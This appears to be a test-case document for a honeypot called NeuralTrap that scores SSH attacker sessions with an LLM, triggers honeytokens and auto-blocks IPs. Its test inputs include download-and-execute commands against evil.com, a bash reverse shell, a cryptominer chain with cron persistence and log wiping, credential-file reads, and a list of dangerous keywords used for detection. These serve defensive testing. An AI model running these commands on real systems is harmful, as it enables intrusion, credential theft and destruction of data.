# 🧪 NeuralTrap — Comprehensive Test Cases

> Full test suite covering all system features. Each test case specifies the exact inputs, expected behavior, and what to verify in both the terminal and the dashboard.

---

## 📋 Test Case Index

| # | Category | Test Name | Expected Result |
|---|----------|-----------|-----------------|
| TC-01 | Malware | Attacker downloads malware via `wget` | Download detected, malware analyzed, high threat |
| TC-02 | Malware | Attacker downloads via `curl` | Same as TC-01 but via curl |
| TC-03 | Malware | Attacker downloads but does NOT execute | Moderate threat, no block |
| TC-04 | Malware | No download, just recon commands | Low threat, no block |
| TC-05 | Malware | Download + execute + persistence | Critical threat, auto-block |
| TC-06 | Honeytoken | Access `id_rsa` | Instant 100% threat, block, honeytoken logged |
| TC-07 | Honeytoken | Access `.aws/credentials` | Instant 100% threat, block, honeytoken logged |
| TC-08 | Honeytoken | Access `wp-config.php` | Instant 100% threat, block, honeytoken logged |
| TC-09 | Honeytoken | `ls` in directory with honeytokens (no `cat`) | No trigger, normal scoring |
| TC-10 | Honeytoken | Access via `find` command | Honeytoken triggered if `id_rsa` in path |
| TC-11 | Scoring | Pure recon session | Low score (~10-30%) |
| TC-12 | Scoring | Escalating attack | Score rises progressively |
| TC-13 | Scoring | Single benign command (`ls`) | Very low score (~5-15%) |
| TC-14 | Scoring | Single critical command (`cat /etc/shadow`) | High score (~70-90%) |
| TC-15 | Blocking | Threat ≥ 85% | Auto-block via iptables |
| TC-16 | Blocking | Threat < 85% | No block, monitoring only |
| TC-17 | Blocking | Localhost 127.0.0.1 | TEST MODE — logged but not actually blocked |
| TC-18 | Forensics | Session with enough commands | AI report generated automatically |
| TC-19 | Forensics | Analyst clicks Accurate | Feedback saved to DB |
| TC-20 | Forensics | Analyst clicks Inaccurate | Feedback saved to DB |
| TC-21 | LLM | LLM classification fires every 3 commands | Classification at commands 3, 6, 9... |
| TC-22 | LLM | Dangerous keyword triggers instant LLM | `wget`, `curl`, `chmod` trigger immediate classification |
| TC-23 | LLM | Final classification on session close | Full analysis runs at disconnect |
| TC-24 | MITRE | Attack maps to MITRE tactics | Tactic IDs stored and displayed |
| TC-25 | Dashboard | All 11 pages render | No errors on any page |
| TC-26 | Cowrie | Login failed events captured | Logged in `login_attempts` table |
| TC-27 | Cowrie | Login success captured | Logged in `login_attempts` table |
| TC-28 | Cowrie | File download captured | Logged in `file_transfers` table |
| TC-29 | Cowrie | Dwell time calculated | `session_summary` has dwell_seconds |
| TC-30 | Cowrie | Client version / HASSH captured | Stored in session_summary |

---

## 🦠 CATEGORY 1 — Malware Download Tests

### TC-01: Attacker Downloads Malware via wget

**Commands:**
```
uname -a
wget http://evil.com/malware.sh
chmod +x malware.sh
./malware.sh
```

**Expected Terminal Output:**
- `⬇️ [session] download http://evil.com/malware.sh` appears
- `🦠 Analyzing malware payload: <shasum>` — malware analyzer fires
- LLM classification: **high threat score ≥ 85%**
- `🚨 HIGH THREAT DETECTED`
- `🚨 BLOCKED: <ip>`
- `📋 Report generated`

**Expected Dashboard:**
- **🦠 Malware Intelligence** — payload listed with AI analysis report and IOCs
- **🚫 Blocked IPs** — IP listed
- **📋 Forensic Reports** — report mentions download and execution
- **⚔️ Live Attacks** — `wget` and `chmod` highlighted in **red**

---

### TC-02: Attacker Downloads via curl

**Commands:**
```
curl -O http://evil.com/backdoor.elf
chmod 777 backdoor.elf
./backdoor.elf
```

**Expected:** Same as TC-01. `curl` is a dangerous keyword → triggers instant LLM classification.

---

### TC-03: Attacker Downloads but Does NOT Execute

**Commands:**
```
uname -a
wget http://example.com/file.tar.gz
ls -la
exit
```

**Expected:**
- Download is captured in `file_transfers`
- LLM scores as **moderate threat (~50-70%)** — downloaded but never executed
- **NO auto-block** (below 85%)
- Forensic report still generated at session close
- Reasoning should mention: *"Downloaded a file but did not execute it"*

---

### TC-04: No Download, Just Recon Commands

**Commands:**
```
whoami
uname -a
hostname
ifconfig
ps aux
exit
```

**Expected:**
- LLM classifies as **"Reconnaissance"** or similar
- Threat score: **10-35%**
- **NO block**
- **NO malware analysis** (nothing was downloaded)
- Forensic report generated with low severity
- MITRE tactics might include `T1082` (System Information Discovery)

---

### TC-05: Download + Execute + Persistence (Full Kill Chain)

**Commands:**
```
cat /proc/cpuinfo
wget http://pool.supportxmr.com/xmrig.tar.gz
tar -xzf xmrig.tar.gz
chmod +x xmrig
./xmrig -o pool.supportxmr.com:3333 -u wallet123 --threads=$(nproc)
echo "@reboot /tmp/xmrig" | crontab -
history -c && rm -f ~/.bash_history
```

**Expected:**
- Full chain detected: download → extract → execute → persist → cover tracks
- Threat score: **90-100%**
- Auto-blocked
- Predicted next: something about persistence or spreading
- MITRE: `T1496` (Resource Hijacking), `T1053.003` (Cron), `T1070` (Indicator Removal)
- Malware analysis triggered for the downloaded file

---

## 🍯 CATEGORY 2 — Honeytoken Tests

### TC-06: Access SSH Private Key (id_rsa)

**Commands:**
```
ls /root/.ssh/
cat /root/.ssh/id_rsa
```

**Expected:**
- `🍯 HONEYTOKEN TRIGGERED: SSH Private Key via 'cat /root/.ssh/id_rsa'` in terminal
- Threat score **instantly set to 100%**
- Attack type: `Honeytoken Triggered`
- **Auto-blocked immediately**
- Reasoning: *"Attacker explicitly interacted with deceptive file: SSH Private Key"*
- Predicted next: *"Data exfiltration and lateral movement"*
- MITRE: `TA0006 Credential Access`
- Honeytoken logged in `honeytoken_triggers` table
- Dashboard **🍯 Honeytoken Activity** shows the trigger

---

### TC-07: Access AWS Credentials

**Commands:**
```
ls /root/
cat /root/.aws/credentials
```

**Expected:**
- `🍯 HONEYTOKEN TRIGGERED: AWS Credentials via 'cat /root/.aws/credentials'`
- Same instant block behavior as TC-06
- Token type: **AWS Credentials**

---

### TC-08: Access WordPress Config

**Commands:**
```
ls /var/www/html/
cat /var/www/html/wp-config.php
```

**Expected:**
- `🍯 HONEYTOKEN TRIGGERED: Database Config via 'cat /var/www/html/wp-config.php'`
- Same instant block behavior as TC-06
- Token type: **Database Config**

---

### TC-09: List Directory with Honeytokens (No cat/access)

**Commands:**
```
ls /root/.ssh/
ls -la /var/www/html/
exit
```

**Expected:**
- **NO honeytoken trigger** — `ls` does not contain `id_rsa` or `wp-config.php` as substrings in the command
- Normal LLM scoring (low threat)
- No block

---

### TC-10: Find Command Containing Honeytoken Path

**Commands:**
```
find / -name id_rsa 2>/dev/null
```

**Expected:**
- **HONEYTOKEN TRIGGERED** — the command string contains `id_rsa`
- Instant 100% threat and block
- This is by design: even searching for the file name triggers the trap

---

### TC-11: Partial Match — Commands That Should NOT Trigger

**Commands:**
```
cat /etc/passwd
cat /var/log/syslog
ls -la /tmp
exit
```

**Expected:**
- **NO honeytoken trigger** — none of `id_rsa`, `.aws/credentials`, `wp-config.php` appear in any command
- Normal LLM scoring based on command danger level
- `cat /etc/passwd` scores moderate but is NOT a honeytoken

---

## 📊 CATEGORY 3 — Threat Scoring Tests

### TC-12: Score Escalation Over Time

**Commands (in order):**
```
whoami                              # → ~5-15%
ls                                  # → ~5%
uname -a                            # → ~10% | LLM classifies at cmd 3
cat /etc/passwd                     # → ~40-60%
cat /etc/shadow                     # → ~70-85%
wget http://evil.com/malware        # → ~80-95% | LLM classifies at cmd 6
chmod +x malware                    # → ~70-85%
./malware                           # → ~85-100%
```

**Expected:**
- **Instant scores** (rule_based_score) escalate command by command
- LLM classification fires at command 3 and 6 → watch the **attack_type** evolve
- Score from LLM should jump significantly at command 6
- After `./malware` → auto-block triggered (≥85%)
- Dashboard Live Threat Monitor shows the **progression**

---

### TC-13: Single Harmless Command

**Commands:**
```
ls
exit
```

**Expected:**
- Instant score for `ls`: **~5-10%**
- No LLM classification (only 1 command, not enough)
- Session closes → final classification runs → **very low threat**
- No block

---

### TC-14: Single Critical Command

**Commands:**
```
cat /etc/shadow
exit
```

**Expected:**
- Instant score for `cat /etc/shadow`: **~70-90%**
- Dangerous keyword detected → immediate LLM classification
- LLM recognizes credential theft → **high score**
- May or may not block (depends on LLM's final score vs 85% threshold)

---

## 🚫 CATEGORY 4 — Auto-Block / Firewall Tests

### TC-15: Threat Score Crosses 85% Threshold

**Commands:**
```
wget http://evil.com/backdoor
chmod +x backdoor
./backdoor
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Expected:**
- LLM scores **≥85%** (reverse shell is critical)
- `🚨 HIGH THREAT DETECTED` printed
- IP inserted into `blocked_ips` table
- For localhost: `[TEST MODE] Would block 127.0.0.1` — logged but not actually blocked
- For real IPs: `sudo iptables -A INPUT -s <IP> -j DROP` executed
- Forensic report generated automatically

---

### TC-16: Threat Score Below 85% — No Block

**Commands:**
```
whoami
hostname
ls /var/log
exit
```

**Expected:**
- LLM scores **~15-30%**
- `✅ Threat score below threshold - monitoring only`
- **No entry** in `blocked_ips`
- Session is still classified and stored in `labeled_sessions`

---

### TC-17: Localhost Protection

**Setup:** All SSH testing goes through `127.0.0.1`

**Expected:**
- When block_ip is called for `127.0.0.1`:
  - Prints `[TEST MODE] Would block 127.0.0.1`
  - Still inserts record into `blocked_ips` with reason "TEST MODE"
  - Does **NOT** run `iptables` command
- This prevents accidentally locking yourself out during testing

---

### TC-18: Already-Blocked IP Reconnects

**Steps:**
1. Trigger a block (e.g., download malware → get blocked)
2. SSH in again from the same IP

**Expected:**
- New session starts (Cowrie accepts the connection regardless)
- NeuralTrap logs the new session normally
- If IP tries to get blocked again → `IP already blocked` message
- No duplicate entry in `blocked_ips`

---

## 📋 CATEGORY 5 — Forensic Report Tests

### TC-19: Auto-Generated Report Content Quality

**Commands (use a complex scenario):**
```
whoami
cat /etc/passwd
cat /etc/shadow
wget http://evil.com/rootkit.ko
insmod rootkit.ko
rm -rf /var/log/*
```

**Expected Report Should Contain:**
- **WHO**: Description of attacker type (e.g., "sophisticated attacker with root-level objectives")
- **WHAT**: Step-by-step command analysis
- **WHY**: Inferred goal (e.g., "install a kernel rootkit for persistence")
- **PREDICTED NEXT MOVE**: Logical next step
- **RISK LEVEL**: High/Critical assessment
- **RECOMMENDED ACTION**: Actionable security advice
- Session intelligence (dwell time, client version) referenced if available

---

### TC-20: Analyst Feedback — Accurate

**Steps:**
1. Go to Dashboard → Forensic Reports
2. Expand any report
3. Click **✅ Accurate**

**Expected:**
- `Feedback saved!` success message
- Database `forensic_reports.analyst_feedback` = `'accurate'`
- Feedback displayed as "Current: accurate"

---

### TC-21: Analyst Feedback — Inaccurate

**Steps:**
1. Click **❌ Inaccurate** on a report

**Expected:**
- `Feedback saved!` error-styled message (red)
- Database `forensic_reports.analyst_feedback` = `'inaccurate'`

---

## 🧠 CATEGORY 6 — LLM Classification Engine Tests

### TC-22: Progressive Classification Every 3 Commands

**Commands (type slowly, watching Terminal 1):**
```
cmd 1: whoami
cmd 2: ls
cmd 3: uname -a          ← LLM fires HERE
cmd 4: cat /etc/passwd
cmd 5: cat /etc/shadow
cmd 6: wget http://x.com  ← LLM fires HERE
cmd 7: chmod +x x
cmd 8: ./x
cmd 9: crontab -e         ← LLM fires HERE
```

**Expected:**
- `🧠 Running LLM classification for <session>...` appears at commands **3, 6, 9**
- Classification result includes: attack_type, threat_score, confidence, reasoning, predicted_next
- Each classification should show **escalating** threat as commands get more dangerous

---

### TC-23: Dangerous Keyword Instant LLM Trigger

**Commands:**
```
ls                        ← no LLM (harmless + not 3rd)
wget http://evil.com/x    ← LLM fires IMMEDIATELY (dangerous keyword)
```

**Expected:**
- `wget` is in the dangerous keywords list: `["wget", "curl", "chmod", "./", "bash -i", "python -c", "cat /etc/shadow", "nc "]`
- LLM fires after just 2 commands because `wget` is dangerous
- No need to wait for the 3-command cycle

---

### TC-24: Final Classification on Session Close

**Commands:**
```
whoami
ls
exit
```

**Expected:**
- Only 2 commands typed — LLM didn't fire during session (no dangerous keywords, not at 3-command boundary)
- On `exit` → Cowrie sends `cowrie.session.closed`
- NeuralTrap runs **final classification** with all accumulated commands + session intel
- Result stored in `labeled_sessions`

---

### TC-25: LLM Handles Non-Interactive Session

**Steps:**
1. SSH into honeypot
2. Fail login multiple times
3. Disconnect without logging in

**Expected:**
- Session has `login_fail_count > 0` but no commands
- On session close: LLM is still called with placeholder command list
- Classification: likely "Brute Force" or "Credential Stuffing"
- Threat score based on number of failed attempts

---

## 🗺️ CATEGORY 7 — MITRE ATT&CK Mapping Tests

### TC-26: Recon Commands → Discovery Tactics

**Commands:**
```
whoami
uname -a
cat /etc/os-release
ip addr show
```

**Expected MITRE Tactics:**
- `T1082` — System Information Discovery
- `T1016` — System Network Configuration Discovery
- `T1033` — System Owner/User Discovery

---

### TC-27: Credential Theft → Credential Access Tactics

**Commands:**
```
cat /etc/shadow
find / -name id_rsa
cat /root/.ssh/id_rsa
```

**Expected MITRE Tactics:**
- `T1003` — OS Credential Dumping
- `T1552.004` — Private Keys
- `TA0006` — Credential Access (if honeytoken triggers)

---

### TC-28: Malware Execution → Execution Tactics

**Commands:**
```
wget http://evil.com/payload
chmod +x payload
./payload
```

**Expected MITRE Tactics:**
- `T1059.004` — Unix Shell
- `T1105` — Ingress Tool Transfer
- `T1204` — User Execution

---

## 📊 CATEGORY 8 — Dashboard Page Tests

### TC-29: All 11 Dashboard Pages Load Without Error

**Steps:**
1. Click each page in the sidebar one by one
2. Verify no Python errors / Streamlit exceptions

**Pages to verify:**
| Page | What to Check |
|------|--------------|
| 🏠 Overview | 4 metric cards + pie chart + bar chart + session table |
| ⚔️ Live Attacks | Terminal-style feed, red highlighting for dangerous commands |
| 🔬 Cowrie Intel | Login events, file transfers, session summaries, labeled sessions |
| 🧠 AI Predictions | Live updating, predicted next command, threat bars |
| 📋 Forensic Reports | Expandable reports, feedback buttons work |
| 🚫 Blocked IPs | IP table + blocked count + attack type distribution chart |
| 👤 Attacker Profiles | Per-IP profiles with session counts, avg/max threat |
| 🌍 Attack World Map | Map renders (requires GeoIP DB + external IPs) |
| 📈 Live Threat Monitor | Score histogram, timeline, statistics cards, MITRE chart |
| 🦠 Malware Intelligence | Payload analysis cards with IOCs |
| 🍯 Honeytoken Activity | Trigger table with counts |

---

### TC-30: Dashboard with Empty Database

**Steps:**
1. Run `python3 clear_db.py`
2. Open dashboard

**Expected:**
- All pages show "No data yet" or "No records" messages
- **No crashes or errors**
- Metric cards show 0

---

### TC-31: Auto Refresh Toggle

**Steps:**
1. Check the "Auto Refresh (10s)" checkbox in the sidebar
2. Wait 10 seconds

**Expected:**
- Page automatically reloads
- New data from active sessions appears without manual refresh
- Uncheck → page stops auto-refreshing

---

## 🔬 CATEGORY 9 — Cowrie Integration Tests

### TC-32: Login Attempts Captured

**Steps:**
1. SSH to honeypot with **wrong** credentials 3 times:
   ```bash
   ssh admin@localhost -p 2222    # password: admin
   ssh root@localhost -p 2222     # password: 123456
   ssh root@localhost -p 2222     # password: toor
   ```
2. SSH with **correct** credentials:
   ```bash
   ssh root@localhost -p 2222     # password: root
   ```

**Expected Terminal:**
- `🔑 [session] login FAILED user='admin'`
- `🔑 [session] login FAILED user='root'`
- `✅ [session] login OK user='root'`

**Expected Dashboard (Cowrie Intel):**
- `login_attempts` table shows all 4 entries
- `success` column: 0, 0, 0, 1
- Usernames and passwords stored

---

### TC-33: File Download Tracking

**Commands (inside honeypot):**
```
wget http://example.com/test.sh
curl -O http://example.com/payload.bin
```

**Expected:**
- `⬇️ [session] download http://example.com/test.sh`
- `file_transfers` table has entries with `direction='download'`
- URL, shasum, outfile captured
- If file exists on disk → malware analysis triggered

---

### TC-34: Dwell Time Calculation

**Steps:**
1. SSH into honeypot
2. Wait ~30 seconds
3. Type a few commands
4. Wait another ~30 seconds
5. Type `exit`

**Expected:**
- `session_summary.dwell_seconds` ≈ 60 seconds
- Dwell time shown in **Cowrie Intel** tab
- Forensic report references the dwell time

---

### TC-35: Client Version and HASSH Fingerprint

**Steps:**
1. SSH into honeypot from any client

**Expected Terminal:**
- `🧩 [session] client version: SSH-2.0-OpenSSH_X.X...`
- `🔐 [session] HASSH: <fingerprint>...`

**Expected Database:**
- `session_summary.client_version` populated
- `session_summary.hassh` populated

---

### TC-36: TTY Log Recording

**Steps:**
1. SSH into honeypot
2. Type some commands
3. Exit

**Expected Terminal:**
- `📼 [session] TTY log closed (<filename>)`

**Expected Database:**
- `session_summary.ttylog_filename` has the filename
- `session_summary.tty_full_path` has the absolute path

---

## 🧰 CATEGORY 10 — test_attack.py Tests

### TC-37: All 5 Scenarios Run Successfully

**Steps:**
```bash
python3 test_attack.py --scenario 1
python3 test_attack.py --scenario 2
python3 test_attack.py --scenario 3
python3 test_attack.py --scenario 4
python3 test_attack.py --scenario 5
```

**Expected for each:**
- Command-by-command scoring with visual bars
- Progressive classification every 3 commands
- Final session analysis with all fields populated
- Score progression chart at the end
- No crashes or LLM errors

---

### TC-38: Scenario Threat Score Expectations

| Scenario | Expected Attack Type | Expected Score Range |
|----------|---------------------|---------------------|
| 1 — Cryptominer | Cryptominer / Resource Hijacking | 85-100% |
| 2 — Mirai Botnet | IoT Botnet / Malware Deployment | 90-100% |
| 3 — Lateral Movement | Credential Theft / Lateral Movement | 85-100% |
| 4 — Privilege Escalation | Privilege Escalation / Rootkit | 90-100% |
| 5 — Stealth Recon | Reconnaissance / Information Gathering | 15-45% |

---

### TC-39: Interactive Mode (Custom Commands)

**Steps:**
```bash
python3 test_attack.py --custom
```
Type:
```
whoami
cat /etc/shadow
wget http://x.com/shell.sh
done
```

**Expected:**
- Each command scored in real-time
- LLM classification at command 3
- Full final analysis after typing `done`

---

### TC-40: Invalid Scenario Number

**Steps:**
```bash
python3 test_attack.py --scenario 99
```

**Expected:**
- `Invalid scenario number. Choose 1-5.`
- No crash

---

## 🔄 CATEGORY 11 — Edge Cases & Stress Tests

### TC-41: Empty Command Input

**Steps:**
1. SSH in
2. Press Enter without typing (empty command)

**Expected:**
- NeuralTrap ignores empty commands (`if not command: return`)
- No crash, no scoring, no LLM call

---

### TC-42: Very Long Command

**Steps:**
```bash
echo "AAAAAAA..." (500+ characters)
```

**Expected:**
- Command is truncated for DB storage but doesn't crash
- LLM processes it normally (may truncate in prompt)

---

### TC-43: Rapid-Fire Commands

**Steps:**
1. Paste 20 commands at once into the SSH session

**Expected:**
- NeuralTrap processes all commands
- LLM fires at every 3rd command (and on dangerous keywords)
- No race conditions or crashes
- All commands stored in `attack_logs`

---

### TC-44: Multiple Concurrent Sessions

**Steps:**
1. Open 3 SSH sessions simultaneously:
   ```bash
   ssh root@localhost -p 2222  # Terminal A
   ssh root@localhost -p 2222  # Terminal B
   ssh root@localhost -p 2222  # Terminal C
   ```
2. Type different commands in each

**Expected:**
- Each session tracked independently with unique `session_id`
- No cross-contamination of commands between sessions
- Dashboard shows 3 separate sessions
- All three classified independently

---

### TC-45: Session Disconnect Without Exit

**Steps:**
1. SSH in
2. Close the terminal window (force disconnect)

**Expected:**
- Cowrie sends `cowrie.session.closed` event
- NeuralTrap runs final classification
- Dwell time still calculated from connect/close timestamps
- No orphaned session state in memory

---

## ✅ SUMMARY — Quick Verification Checklist

After running all tests, verify these key system behaviors:

- [ ] **Rule-based scoring** works per-command (instant)
- [ ] **LLM classification** fires every 3 commands AND on dangerous keywords
- [ ] **Final classification** runs on every session close
- [ ] **Honeytoken detection** triggers on `id_rsa`, `.aws/credentials`, `wp-config.php`
- [ ] **Honeytokens** cause instant 100% threat + auto-block
- [ ] **Auto-block** activates at ≥85% threat score
- [ ] **Localhost** is protected from actual iptables blocking (TEST MODE)
- [ ] **Forensic reports** are generated automatically by the LLM
- [ ] **Analyst feedback** saves to the database
- [ ] **Malware analysis** fires when a file is downloaded with a shasum
- [ ] **All 11 dashboard pages** render without errors
- [ ] **Session data** (dwell time, HASSH, client version, TTY logs) captured
- [ ] **MITRE ATT&CK** tactics mapped and displayed
- [ ] **Predicted next command** shown in AI Predictions tab
- [ ] **Attacker profiles** aggregate multi-session data per IP
- [ ] **test_attack.py** runs all 5 scenarios with correct classifications
- [ ] **No crashes** on empty DB, empty commands, or edge cases
